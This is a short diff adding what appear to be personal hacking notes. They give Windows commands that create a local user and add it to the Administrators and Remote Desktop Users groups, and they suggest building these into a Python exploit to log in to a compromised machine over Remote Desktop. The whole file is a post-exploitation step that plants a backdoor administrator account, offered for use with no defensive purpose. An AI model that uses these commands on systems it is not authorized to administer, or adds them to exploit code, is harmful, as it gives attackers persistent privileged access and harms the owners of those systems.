@@ -1,0 +1,20 @@
+Remote Desktop Way
+
+To add user in windows command is...
+
+net user <username> <password> /add
+Example: net user test test /add
+
+To add user to a group for Remote Desktop and Administrators group is...
+
+net localgroup "Remote Desktop Users" UserLoginName /add
+net localgroup "administrators" UserLoginName /add
+
+Example: net localgroup "Remote Desktop Users" test /add
+Example: net localgroup "administrators" test /add
+
+
+If you implement this in the python exploit you will actually be able to login via Remote Desktop GUI and that is another way to do it. I like the firewall method better though.
+
+https://www.top-password.com/blog/ad...in-windows-10/
+https://operating-systems.wonderhowt...ndows-0125689/
